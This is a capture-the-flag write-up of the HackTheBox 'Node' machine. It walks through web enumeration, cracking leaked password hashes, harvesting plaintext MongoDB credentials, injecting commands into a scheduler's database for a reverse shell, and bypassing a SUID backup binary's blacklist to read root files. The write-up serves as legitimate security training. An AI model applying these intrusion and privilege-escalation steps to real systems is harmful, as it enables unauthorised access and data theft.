---
title: "Node"
date: 2023-08-22T12:14:24+02:00
tags: ["privesc","web","linux","buffer overflow"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Linux machine which has a website with a password leak. We gain access to the user thanks to a credentials leak. We privesc thanks to a mongoDB javascript and SUID binary exploitation."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Node
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Node

![/HTB/node-icon.png](/HTB/node-icon.png)

## Tools Used

- nmap
- john
- mongoDB
- ltrace

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
  35   │ PORT     STATE SERVICE         REASON         VERSION
  36   │ 22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; p
       │ rotocol 2.0)
  37   │ | ssh-hostkey:
  38   │ |   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
  39   │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmE
       │ gVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+
       │ O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRn
       │ w28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEV
       │ L5tYGb
  40   │ |   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
  41   │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5
       │ D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=
  42   │ |   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
  43   │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
  44   │ 3000/tcp open  hadoop-datanode syn-ack ttl 63 Apache Hadoop
  45   │ | hadoop-tasktracker-info:
  46   │ |_  Logs: /login
  47   │ | http-methods:
  48   │ |_  Supported Methods: GET HEAD POST OPTIONS
  49   │ |_http-title: MyPlace
  50   │ |_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
  51   │ | hadoop-datanode-info:
  52   │ |_  Logs: /login
  53   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have two open ports one with **ssh** and **http** web server at **port 3000**.

## Enumeration

As the only point to start the enumeration step we are going to enumerate the web page.

![/HTB/node-1.png](/HTB/node-1.png)

We are in front a type of social network and we can see some of the users which are registered in.

![/HTB/node-2.png](/HTB/node-2.png)

By accessing on any users which are shown by the website we can see that the page redirects us to `http://10.10.10.58:3000/profiles/[user]` .

I tried to change the link to `http://10.10.10.58:3000/profiles/admin` and `http://10.10.10.58:3000/profiles/root` but no one seems to be leaked.

![/HTB/node-3.png](/HTB/node-3.png)

If we return at the home page we can see a login button which redirects you to a login form.

![/HTB/node-27.png](/HTB/node-27.png)

I tried a common/default password and a basic SQLi without succeed. As we know the server is running nodeJS so it’s so probable that is running with mongoDB so I tried a basic noSQLi too but none returned anything interesting.

Perfect, we have some info but it’s not pretty enough we need something else so let’s focus now on fuzzing.

```bash
ffuf -u http://10.10.10.43/FUZZ -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -c -o fuzz | tee fuzz.save
```

```bash
   1   │ [Status: 301, Size: 173, Words: 7, Lines: 10, Duration: 157ms]
   2   │ | URL | http://10.10.10.58:3000/uploads
   3   │ | --> | /uploads/
   4   │     * FUZZ: uploads
   5   │
   6   │ [Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 104ms]
   7   │ | URL | http://10.10.10.58:3000/assets
   8   │ | --> | /assets/
   9   │     * FUZZ: assets
  10   │
  11   │ [Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 130ms]
  12   │ | URL | http://10.10.10.58:3000/vendor
  13   │ | --> | /vendor/
  14   │     * FUZZ: vendor
```

I tried to access to the three directories but all of them redirects us to the home page.

## Exploiting

After hours of trying stuff, I discovered a directory which has not been fuzzed, by inspecting the page.

![/HTB/node-4.png](/HTB/node-4.png)

There is an api running at the background

![/HTB/node-5.png](/HTB/node-5.png)

When we access to the url we can see that there are the same users as before and an admin account with hashed passwords. I cracked them more efficiently thanks to [hashes.com](http://hashes.com) 

![/HTB/node-6.png](/HTB/node-6.png)

We are able to crack three hashes

**myP14ceAdm1nAcc0uNT** : manchester

**tom** : spongebob

**mark** : snowflake

Now, let’s see if the admin credentials works on the login form seen before.

![/HTB/node-7.png](/HTB/node-7.png)

We are in and we only are able to download a backup of something.

![/HTB/node-8.png](/HTB/node-8.png)

![/HTB/node-9.png](/HTB/node-9.png)

Seems to be encoded on base64 so let’s decode it.

```bash
cat myplace.backup | base64 -d > myplace
```

![/HTB/node-10.png](/HTB/node-10.png)

Awesome, we have a ZIP archive but when I try to unzip it seems to be locked with password. 

Maybe zip2john helps us in this situation

```bash
zip2john myplace > zip_hash.txt
john --wordlist=~/Documents/wordlists/rockyou.txt  zip_hash.txt
```

```bash
myplace:magicword::myplace:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/serve-static/README.md, var/www/myplace/package-lock.json:myplace

1 password hash cracked, 0 left
```

We found a password let’s unzip the compressed file

![/HTB/node-11.png](/HTB/node-11.png)

Looks like the backup of the website

Inside of the app.js file we can find a mongoDB credentials in plain text for mark, we can try to connect as mark via ssh

```bash
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

## Gaining an Initial Foothold

![/HTB/node-12.png](/HTB/node-12.png)

We get access to an user, let search the user’s flag.

After looking at mark’s home directory, we don’t find any flag.

![/HTB/node-13.png](/HTB/node-13.png)

With find we can observe that the flag is at tom’s home directory but we don’t have permissions to access to this folder (Privesc is required).

## Escalating Privilege

Let’s elevate privileges.

First let’s take a look if the current user has any sudo privileges

![/HTB/node-26.png](/HTB/node-26.png)

We don’t have any sudo privileges so let’s see if there is some SUID binary which helps us privesc.

```bash
find \-perm -4000 -user root 2>/dev/null
```

```bash
./usr/lib/eject/dmcrypt-get-device
./usr/lib/snapd/snap-confine
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/local/bin/backup
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/newgidmap
./usr/bin/chsh
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/newuidmap
./bin/ping
./bin/umount
./bin/fusermount
./bin/ping6
./bin/ntfs-3g
./bin/su
./bin/mount
```

`./usr/local/bin/backup` looks pretty interesting

![/HTB/node-14.png](/HTB/node-14.png)

The only ones can execute it are root and the users which belong to the admin’s group.

Taking a look of the tom’s groups we can see that belong to admin’s group

![/HTB/node-15.png](/HTB/node-15.png)

The thing is that we need to get access to tom’s account in order to run this SUID binary.

Let’s take a look at the processes.

```bash
ps -faux
```

```bash
root         1  1.9  0.7  37892  6000 ?        Ss   22:30   0:02 /sbin/init
root       455  0.0  0.3  28032  2840 ?        Ss   22:30   0:00 /lib/systemd/systemd-journald
root       511  0.0  0.4 102968  3760 ?        Ss   22:30   0:00 /sbin/lvmetad -f
root       527  0.0  0.4  44312  3764 ?        Ss   22:30   0:00 /lib/systemd/systemd-udevd
systemd+   889  0.0  0.3 100324  2508 ?        Ssl  22:30   0:00 /lib/systemd/systemd-timesyncd
root      1074  0.0  0.4  29008  3052 ?        Ss   22:30   0:00 /usr/sbin/cron -f
syslog    1075  0.0  0.4 256400  3384 ?        Ssl  22:30   0:00 /usr/sbin/rsyslogd -n
root      1076  0.0  0.1   4400  1264 ?        Ss   22:30   0:00 /usr/sbin/acpid
root      1080  0.0  0.4  28548  3088 ?        Ss   22:30   0:00 /lib/systemd/systemd-logind
root      1088  0.0  0.8 275892  6168 ?        Ssl  22:30   0:00 /usr/lib/accountsservice/accounts-daem
root      1093  0.5  1.3 192268 10200 ?        Ssl  22:30   0:00 /usr/bin/vmtoolsd
message+  1100  0.0  0.5  42904  3792 ?        Ss   22:30   0:00 /usr/bin/dbus-daemon --system --addres
root      1111  0.0  0.1  95368  1388 ?        Ssl  22:30   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
daemon    1113  0.0  0.2  26044  2192 ?        Ss   22:30   0:00 /usr/sbin/atd -f
root      1118  0.0  2.7 193596 21164 ?        S<sl 22:30   0:00 /usr/lib/snapd/snapd
root      1141  0.0  0.0  13376   168 ?        Ss   22:30   0:00 /sbin/mdadm --monitor --pid-file /run/
root      1145  0.0  0.7 277180  6056 ?        Ssl  22:30   0:00 /usr/lib/policykit-1/polkitd --no-debu
mongodb   1231  0.9 11.4 278880 87072 ?        Ssl  22:30   0:00 /usr/bin/mongod --auth --quiet --confi
tom       1234  0.5  5.2 1007544 39528 ?       Ssl  22:30   0:00 /usr/bin/node /var/scheduler/app.js
tom       1236  0.7  5.3 1019880 40344 ?       Ssl  22:30   0:00 /usr/bin/node /var/www/myplace/app.js
root      1240  0.0  0.7  65520  5548 ?        Ss   22:30   0:00 /usr/sbin/sshd -D
root      1501  0.0  0.9  95404  6956 ?        Ss   22:31   0:00  \_ sshd: mark [priv]
mark      1514  0.0  0.4  95404  3256 ?        S    22:32   0:00      \_ sshd: mark@pts/0
mark      1515  0.3  0.6  19608  4756 pts/0    Ss   22:32   0:00          \_ -bash
mark      1530  0.0  0.4  34724  3176 pts/0    R+   22:32   0:00              \_ ps -faux
root      1257  0.0  0.0   5224   156 ?        Ss   22:30   0:00 /sbin/iscsid
root      1258  0.0  0.4   5724  3520 ?        S<Ls 22:30   0:00 /sbin/iscsid
root      1317  0.0  0.2  15940  1804 tty1     Ss+  22:30   0:00 /sbin/agetty --noclear tty1 linux
mark      1504  0.0  0.6  45248  4572 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
mark      1506  0.0  0.2  61344  2068 ?        S    22:32   0:00  \_ (sd-pam)
```

We can see a mongoDB running and that node.js is executing two processes the webserver located at `/var/www/myplace` and other one located at `/VAR/scheduler` 

Navigating to `/var/www/myplace` we can see that is the same folder as the backup so let’s focus on `/var/scheduler` we have other app.js

```jsx
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

It’s pretty similar as the first one but does different stuff, we can observe that the code execute the command allocated at cmd which is on the tasks collection of the scheduler database.

Let’s try to connect to mongoDB and see who is executing that commands.

```bash
mongo -u mark -p 5AYRft73VtFpc84k scheduler
```

Once in we can list the collections to assure that tasks really exists on the database.

![/HTB/node-16.png](/HTB/node-16.png)

Now let’s insert the command at cmd. First, I am going to put the following command.

```jsx
touch /tmp/test
```

![/HTB/node-17.png](/HTB/node-17.png)

If all goes well the command should be executed, this command create a file at tmp directory called test which leaks who has executed the command.

![/HTB/node-18.png](/HTB/node-18.png)

The owner is tomas, so let’s change the command and try to insert an one line reverse shell. Before inserting the command we need to put a nc listener.

```jsx
nc -lv 4444
```

![/HTB/node-19.png](/HTB/node-19.png)

![/HTB/node-20.png](/HTB/node-20.png)

We are logged as tomas.

As always we need to do the tty treatment, the objective of this write up is not to teach how to do it so I am going to skip this step.

Now let’s cat the **user’s flag**.

![/HTB/node-21.png](/HTB/node-21.png)

Perfect only rests to know how works the backup SUID binary. ltrace can gives us more info of what is happening at background.

The binary doesn’t seems to have -h flag.

First I try to run it without ltrace and without any args but nothing happened.

With args shows some stuff but is pretty irrelevant.

```bash
__libc_start_main(0x80489fd, 3, 0xfffa6ee4, 0x80492c0 <unfinished ...>
geteuid()                                        = 1000
setuid(1000)                                     = 0
exit(1 <no return ...>
+++ exited (status 1) +++
```

After that I start with one argument and increased the number of argument to one in each try until I get a different response.

With three arguments I receive the following response.

![/HTB/node-22.png](/HTB/node-22.png)

We have now how much arguments is required to execute the command now let’s figure what we need to put in this arguments.

Let’s run it again but this time with ltrace

Checking the first lines of the output we can observe a comparison.

```bash
strcmp("a", "-q")                                = 1
```

So we know that in the first arguments we need to put the -q flag (Is not required at all because refers to the quiet mode).

If we continue reading the output of ltrace we can see a lines where the second argument is compared with strings taken from a keys file located on `/etc/myplace/keys` 

```bash
fopen("/etc/myplace/keys", "r")                  = 0x8a4e410
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x8a4e410) = 0xff84b77f
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n") = 64
strcmp("a", "a01a6aa5aaf1d7729f35c8278daae30f"...) = -1
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x8a4e410) = 0xff84b77f
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n") = 64
strcmp("a", "45fac180e9eee72f4fd2d9386ea7033e"...) = 1
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x8a4e410) = 0xff84b77f
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n") = 64
strcmp("a", "3de811f4ab2b7543eaf45df611c2dd25"...) = 1
fgets("\n", 1000, 0x8a4e410)                     = 0xff84b77f
```

Now we know that the second argument requires a key (I choosed the first one).

Nothing is outputted for the third argument so let’s put the info which we gathered and still putting a random argument for the third one and see what outputs ltrace.

Once executed ltrace throws more info

```bash
strstr("a", "..")                                                                                                                = nil
strstr("a", "/root")                                                                                                             = nil
strchr("a", ';')                                                                                                                 = nil
strchr("a", '&')                                                                                                                 = nil
strchr("a", '`')                                                                                                                 = nil
strchr("a", '$')                                                                                                                 = nil
strchr("a", '|')                                                                                                                 = nil
strstr("a", "//")                                                                                                                = nil
strcmp("a", "/")                                                                                                                 = 1
strstr("a", "/etc")                                                                                                              = nil
strcpy(0xff96e6db, "a")                                                                                                          = 0xff96e6db
getpid()                                                                                                                         = 1616
time(0)                                                                                                                          = 1692657131
clock(0, 0, 0, 0)                                                                                                                = 2197
srand(0x6be79211, 0xc66d38c7, 0x6be79211, 0x804918c)                                                                             = 0
rand(0, 0, 0, 0)                                                                                                                 = 0x24e99f77
sprintf("/tmp/.backup_619290487", "/tmp/.backup_%i", 619290487)                                                                  = 22
sprintf("/usr/bin/zip -r -P magicword /tm"..., "/usr/bin/zip -r -P magicword %s "..., "/tmp/.backup_619290487", "a")             = 65
system("/usr/bin/zip -r -P magicword /tm"... <no return ...>
```

The binary is comparing the third argument with existing directories and then zips the directory with the same password which we have used before with the web backup. Thanks to that I realized that maybe is the tool which uses the webpage to perform the backups.

One thing we can do is do a backup of the root’s directory, as it is a SUID binary it will allow us to compress such directory without problem. I perform the following command.

```bash
backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /root
```

```bash
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
```

We receive a base64 encoded output so suggests the same procedure as before.

Once unzipped the file we have only have one file with the following flag.

![/HTB/node-23.png](/HTB/node-23.png)

I am not a expert but doesn’t seems a flag xD.

Maybe the binary is doing any type of comparison to exclude some directories for being zipped like a kind of blacklist. If we take a look again on the above code we can see that is comparing the argument with `/root` so maybe is not contemplating `root` argument without the slash.

So If we move to the `/` directory and try the following command we are skipping the blacklist check.

```bash
backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 root
```

```bash
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
```

Now the output is more bigger, let’s decode and unzip it.

![/HTB/node-24.png](/HTB/node-24.png)

Now looks more like a root’s directory :D. Let’s cat the **root’s flag**.

![/HTB/node-25.png](/HTB/node-25.png)

**Thank you for reading, and happy hacking! 😄**